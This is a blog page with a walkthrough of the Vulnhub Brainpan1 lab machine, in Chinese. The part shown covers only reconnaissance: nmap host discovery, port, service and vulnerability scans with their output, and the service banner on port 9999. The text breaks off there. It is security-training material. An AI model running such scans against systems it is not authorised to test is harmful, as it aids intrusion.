<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:image:type" content="image/png" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><meta name="keywords" content="Sunset,个人博客,网络安全,渗透测试,CTF,HackTheBox,HackMyVM,技术博客" data-next-head=""/><meta name="author" content="Sunset" data-next-head=""/><link rel="icon" href="https://www.sunsetaction.top/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="https://www.sunsetaction.top/images/logo.png" sizes="180x180" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="/images/logo.png" data-next-head=""/><meta name="theme-color" content="#b91c1c" data-next-head=""/><link rel="preload" href="/fonts/LXGWWenKai-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><link rel="preload" href="/fonts/IBMPlexMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><title data-next-head="">Vulnhub - Brainpan1 | Sunset Blog</title><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Brainpan1 主机发现端口扫描 1. 使用nmap扫描网段类存活主机 因为靶机是我最后添加的，所以靶机IP是166 2. 扫描主机开放端口 3. 扫描主机服务版本以及系统版本 扫出了很奇怪的东西 4. 扫描漏洞 什么都没有 9999端口 1. 在浏览器访问出现了 2. 使用nc连接尝试 尝试输..." data-next-head=""/><meta property="og:title" content="Vulnhub - Brainpan1 | Sunset Blog" data-next-head=""/><meta property="og:description" content="Brainpan1 主机发现端口扫描 1. 使用nmap扫描网段类存活主机 因为靶机是我最后添加的，所以靶机IP是166 2. 扫描主机开放端口 3. 扫描主机服务版本以及系统版本 扫出了很奇怪的东西 4. 扫描漏洞 什么都没有 9999端口 1. 在浏览器访问出现了 2. 使用nc连接尝试 尝试输..." data-next-head=""/><meta property="og:url" content="https://www.sunsetaction.top/2025/04/02/VulnhubBrainpan1" data-next-head=""/><meta property="og:type" content="article" data-next-head=""/><meta property="article:published_time" content="2025-04-02" data-next-head=""/><meta property="article:modified_time" content="2025-04-02" data-next-head=""/><meta property="article:author" content="Sunset" data-next-head=""/><meta property="article:section" content="靶机" data-next-head=""/><meta property="article:tag" content="Vulnhub" data-next-head=""/><meta property="og:image" content="https://www.sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Vulnhub - Brainpan1" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><link rel="canonical" href="https://www.sunsetaction.top/2025/04/02/VulnhubBrainpan1" data-next-head=""/><link rel="preload" href="/_next/static/css/ef713f45b0b41153.css" as="style"/><link rel="preload" href="/_next/static/css/f055e431c58b907b.css" as="style"/><script type="application/ld+json" data-next-head="">{"@context":"https://schema.org","@type":"BlogPosting","datePublished":"2025-04-02","description":"Brainpan1 主机发现端口扫描 1. 使用nmap扫描网段类存活主机 因为靶机是我最后添加的，所以靶机IP是166 2. 扫描主机开放端口 3. 扫描主机服务版本以及系统版本 扫出了很奇怪的东西 4. 扫描漏洞 什么都没有 9999端口 1. 在浏览器访问出现了 2. 使用nc连接尝试 尝试输...","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.sunsetaction.top/2025/04/02/VulnhubBrainpan1"},"headline":"Vulnhub - Brainpan1","image":["https://www.sunsetaction.top/images/logo.png"],"dateModified":"2025-04-02","author":{"@type":"Person","name":"Sunset"},"publisher":{"@type":"Organization","name":"Sunset Blog","logo":{"@type":"ImageObject","url":"https://www.sunsetaction.top/images/logo.png"}}}</script><script>
              (function() {
                try {
                  // 读取用户保存的主题偏好
                  const savedTheme = localStorage.getItem('theme');
                  
                  // 检测系统主题偏好
                  const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
                  
                  // 判断是否应该使用暗黑模式
                  const shouldUseDark = savedTheme === 'dark' || (!savedTheme && systemPrefersDark);
                  
                  // 立即应用暗黑模式（在页面渲染前）
                  if (shouldUseDark) {
                    document.documentElement.classList.add('dark');
                  }
                } catch (e) {
                  // 静默处理错误，避免阻塞页面加载
                  console.error('Theme initialization error:', e);
                }
              })();
            </script><link rel="stylesheet" href="/_next/static/css/ef713f45b0b41153.css" data-n-g=""/><link rel="stylesheet" href="/_next/static/css/f055e431c58b907b.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-d2c05f55b5519780.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-f21970b4881df644.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/796-34c17833b03faf26.js" defer=""></script><script src="/_next/static/chunks/pages/%5Byear%5D/%5Bmonth%5D/%5Bday%5D/%5Bid%5D-4c7ff0ae52612d94.js" defer=""></script><script src="/_next/static/88HS9mtGKBYYdCm8EXeaK/_buildManifest.js" defer=""></script><script src="/_next/static/88HS9mtGKBYYdCm8EXeaK/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="w-full bg-[#fafafa] dark:bg-[#1f2022]" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><div class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</div></div><div class="mt-2 grid grid-cols-5"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/tags/">Tags</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full relative"><div class="flex justify-center"><article class="w-full md:w-3/4 lg:w-2/3 xl:w-4xl px-3 mt-5 md:mt-15 max-w-[800px]" style="opacity:0;transform:translateY(20px)"><h1 class="text-xl md:text-2xl font-bold text-red-700 dark:text-red-400" style="opacity:0;transform:translateX(-20px)">Vulnhub - Brainpan1</h1><div class="flex flex-col" style="opacity:0"><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">SUNSET</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">2025-04-02</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">(Updated:<!-- -->2025-04-02<!-- -->)</p></div><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Category:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">靶机</span></div><div class="flex flex-wrap text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Tags:</p><a href="/tag/Vulnhub/"><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300 cursor-pointer hover:bg-red-700 hover:text-white transition-colors">Vulnhub</span></a></div></div><div style="opacity:0;transform:translateY(10px)"><div class="my-8 text-center"><div class="flex flex-col items-center gap-3"><div class="w-8 h-8 border-4 border-red-700 dark:border-red-400 border-t-transparent rounded-full animate-spin"></div><p class="text-gray-500 dark:text-gray-400 text-sm">加载中...</p></div></div></div></article></div></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><div class="flex justify-center items-center gap-2 mb-4 text-sm text-gray-600 dark:text-gray-400"><a class="inline-flex items-center gap-1 hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 RSS Feed" href="/rss.xml"><svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20C5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1Z"></path></svg>RSS</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 Atom Feed" href="/atom.xml">Atom</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 JSON Feed" href="/feed.json">JSON</a></div><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"VulnhubBrainpan1","contentHtml":"\u003ch1\u003eBrainpan1\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://www.vulnhub.com/entry/brainpan-1,51/\"\u003ehttps://www.vulnhub.com/entry/brainpan-1,51/\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2\u003e主机发现端口扫描\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e使用nmap扫描网段类存活主机\u003c/p\u003e\n\u003cp\u003e因为靶机是我最后添加的，所以靶机IP是\u003ccode\u003e166\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sP \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.0\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e                                        \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-10-24 22:29 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.1\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00038\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:C0:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e08\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.2\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00018\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:FB:CA:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.166\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00043\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:E7:\u003cspan class=\"hljs-number\"\u003e37\u003c/span\u003e:\u003cspan class=\"hljs-title function_ invoke__\"\u003eBE\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.254\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00011\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:F8:B6:\u003cspan class=\"hljs-title function_ invoke__\"\u003eBD\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.151\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描主机开放端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sT -min-rate \u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e -p- \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.166\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-10-24 22:30 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.166\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.0024\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e65533\u003c/span\u003e closed tcp \u003cspan class=\"hljs-title function_ invoke__\"\u003eports\u003c/span\u003e (conn-refused)\nPORT      STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e9999\u003c/span\u003e/tcp  open  abyss\n\u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e/tcp open  snet-sensor-mgmt\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:E7:\u003cspan class=\"hljs-number\"\u003e37\u003c/span\u003e:\u003cspan class=\"hljs-title function_ invoke__\"\u003eBE\u003c/span\u003e (VMware)\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描主机服务版本以及系统版本\u003c/p\u003e\n\u003cp\u003e扫出了很奇怪的东西\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sT -sV -O -p9999,\u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.166\u003c/span\u003e \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-10-24 22:31 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.166\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00058\u003c/span\u003es latency).\n\nPORT      STATE SERVICE VERSION\n\u003cspan class=\"hljs-number\"\u003e9999\u003c/span\u003e/tcp  open  abyss?\n\u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e/tcp open  http    SimpleHTTPServer \u003cspan class=\"hljs-number\"\u003e0.6\u003c/span\u003e (Python \u003cspan class=\"hljs-number\"\u003e2.7\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e)\n\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org/cgi-bin/submit.cgi?new-service :\u003c/span\u003e\nSF-Port9999-TCP:V=\u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN%I=\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e%D=\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e%Time=\u003cspan class=\"hljs-number\"\u003e671\u003c/span\u003eA5A30%P=x86_64-pc-linux-gnu%\nSF:\u003cspan class=\"hljs-title function_ invoke__\"\u003er\u003c/span\u003e(\u003cspan class=\"hljs-literal\"\u003eNULL\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e298\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\|\\x20\\x20\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x\nSF:20\\x20\\n_\\|_\\|_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|_\\|\\x20\\x20\\x20\\x20_\\|_\\\nSF:|_\\|\\x20\\x20\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\\nSF:x20\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\n_\\|\\x20\\x20\\x20\\x20_\nSF:\\|\\x20\\x20_\\|_\\|\\x20\\x20\\x20\\x20\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\nSF:\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\nSF:\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\n_\\|\\x20\\x20\\x20\\x2\nSF:0_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x\nSF:20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x\nSF:20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\n_\\|_\\|_\\|\\x\nSF:20\\x20\\x20\\x20_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\\nSF:x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\x20\\x20\\x\nSF:20\\x20_\\|_\\|_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\n\\x20\\x20\\x20\\x20\\x20\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x\nSF:20\\x20\\x20_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x\nSF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\n\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x\nSF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\nSF:x20\\x20\\x20_\\|\\n\\n\\[________________________\\x20WELCOME\\x20TO\\x20BRAINP\nSF:AN\\x20_________________________\\]\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20ENT\nSF:ER\\x20THE\\x20PASSWORD\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x\nSF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\nSF:n\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u003e\u003e\\x20\"\u003c/span\u003e);\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:E7:\u003cspan class=\"hljs-number\"\u003e37\u003c/span\u003e:\u003cspan class=\"hljs-title function_ invoke__\"\u003eBE\u003c/span\u003e (VMware)\nWarning: OSScan results may be unreliable because we could not find at least \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e open \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e closed port\nDevice type: general purpose\nRunning: Linux \u003cspan class=\"hljs-number\"\u003e2.6\u003c/span\u003e.X|\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e.X\nOS CPE: cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e2.6\u003c/span\u003e cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e\nOS details: Linux \u003cspan class=\"hljs-number\"\u003e2.6\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e32\u003c/span\u003e - \u003cspan class=\"hljs-number\"\u003e3.10\u003c/span\u003e\nNetwork Distance: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e hop\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描漏洞\u003c/p\u003e\n\u003cp\u003e什么都没有\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enmap -script=vuln -p9999,\u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.166\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e34\u003c/span\u003e CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.166\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00068\u003c/span\u003es latency).\n\nPORT      STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e9999\u003c/span\u003e/tcp  \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  abyss\n\u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  snet-sensor-mgmt\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e9999端口\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e在浏览器访问出现了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e_|                            _|                                        \n_|_|_|    _|  